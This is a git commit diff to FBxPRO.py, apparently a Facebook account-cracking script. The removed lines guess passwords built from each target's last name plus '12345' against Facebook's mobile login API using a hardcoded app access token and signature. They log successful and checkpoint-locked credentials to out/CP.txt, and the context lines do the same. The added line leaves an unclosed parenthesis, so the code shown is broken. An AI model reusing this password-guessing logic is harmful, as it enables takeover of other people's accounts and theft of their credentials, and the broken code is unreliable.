89c72e053fec5d9b48fd0f1395d0bc2f46b61738
Zero-ZxXxAngel <65072876+Zero-ZxXxAngel@users.noreply.github.com>
2020-05-18 00:57:48 +0700

    Update FBxPRO.py

--- FBxPRO.py
+++ FBxPRO.py
@@ -447,21 +447,7 @@ def pilih_super():
 																	cek = open("out/CP.txt", "a")
 																	cek.write(user+"|"+pass7+"\n")
 																	cek.close()
-																	cekpoint.append(user+pass7)
-                                                                                                                                else:
-													                                pass8 = b['last_name'] + '12345'
-													                                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-													                                q = json.load(data)
-													                                if 'access_token' in q:
-														                                print '          \x1b[1;92m[Selesai✔] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass8 + ' ✔ ' + b['name']
-														                                oks.append(user+pass8)
-													                                else:
-														                                if 'www.facebook.com' in q["error_msg"]:
-															                        print '          \x1b[1;36;40m[Selesai✔] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass8 + ' ✔ ' + b['name']
-															                        cek = open("out/CP.txt", "a")
-															                        cek.write(user+"|"+pass8+"\n")
-															                        cek.close()
-															                        cekpoint.append(user+pass8)
+																	cekpoint.append(user+pass7
 		except:
 			pass
 		
